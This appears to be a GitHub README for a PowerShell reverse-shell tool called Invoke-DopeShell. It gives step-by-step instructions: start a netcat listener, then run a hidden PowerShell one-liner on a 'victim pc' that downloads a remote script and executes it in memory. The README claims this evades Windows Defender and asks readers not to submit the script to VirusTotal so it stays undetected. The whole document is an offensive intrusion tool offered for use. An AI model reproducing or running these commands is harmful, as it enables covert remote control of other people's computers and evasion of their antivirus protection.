<img src="https://img.shields.io/badge/PowerShell-%E2%89%A5%20v3.0-blue">
<img src="https://img.shields.io/badge/Developed%20on-kali%20linux-blueviolet">

# INSTRUCTIONS : - 
<br>
 <br> 
1.) Run [nc -nlvp 'port'] on your terminal to start up a listener.
<br>
 <br> 
2.) Open powershell on the victim pc and type:-  <br> 
 <br> 
Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command IEX (IWR 'https://raw.githubusercontent.com/anonymous300502/powershell_payload/main/Invoke-DopeShell.ps1' -UseBasicParsing); Invoke-DopeShell 'IP' 'PORT'". <br> Enter the IP ADDR and PORT of YOUR machine from where you are listening.

## This will spawn a interactive shell with the target pc and run in memory to evade AV 
### Currently undetectable by the latest updated version of windows defender on Win 11 ( last tested on 17:00 IST June 13th 2024) 

Please dont upload the script on virus total :) 


# SCREENSHOTS:-
<br>
## Listener - 
<br>
<img src="https://github.com/anonymous300502/powershell_payload/blob/main/listener.png.png">
<br>
## Spawned Connection without alerting Windows Defender -
<br>
<img scr="powershell_payload/spawned_interactive_shell.png.png">
<br>
## Victim Pc - 
<br>
<img src="https://github.com/anonymous300502/powershell_payload/blob/main/victimpc.png.png">
<br>
